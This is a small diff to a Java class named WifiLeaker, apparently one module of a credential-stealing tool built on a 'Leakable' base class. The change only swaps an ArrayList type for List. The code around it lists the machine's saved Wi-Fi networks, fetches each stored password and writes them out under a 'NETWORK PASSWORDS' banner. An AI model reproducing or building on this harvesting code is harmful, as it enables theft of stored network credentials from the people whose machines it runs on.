@@ -6,6 +6,7 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
 import java.util.Enumeration;
+import java.util.List;
 import java.util.Map;
 import java.util.Properties;
 
@@ -27,7 +28,7 @@ public class WifiLeaker extends Leakable {
     } catch (final UnknownHostException ignored) {
     }
     appendLine("NETWORK PASSWORDS == START");
-    final ArrayList<String> list = NetworkUtilities.getWiFiNameList();
+    final List<String> list = NetworkUtilities.getWiFiNameList();
     for (final String string : list) {
       appendLine(NetworkUtilities.getWiFiMap(NetworkUtilities.getPasswordByName(string)));
     }
